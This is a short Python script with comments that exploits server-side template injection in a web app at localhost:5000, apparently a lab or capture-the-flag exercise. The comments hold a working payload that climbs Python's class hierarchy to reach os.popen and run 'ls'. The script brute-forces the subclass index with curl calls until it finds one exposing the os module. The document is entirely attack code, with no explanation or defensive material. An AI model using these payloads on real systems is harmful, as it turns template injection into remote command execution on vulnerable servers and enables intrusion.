# http://localhost:5000/?name={{1%2b1}} # {{ 1 + 1}} 會出錯
# http://localhost:5000/?name={{%27%27.__class__.__mro__[1].__subclasses__()[244].__init__.__globals__[%27os%27].popen(%27ls%27).read()}}
import os

for i in range(0, 1000):
	html = 'curl "http://localhost:5000/?name=\{\{%27%27.__class__.__mro__[1].__subclasses__()[' + str(i) + '].__init__.__globals__[%27os%27]\}\}"'
	result = os.popen(html).read()
	if "Hello" in result and "Hello !" not in  result:
		print("i = ", i)
		print(result)
		break
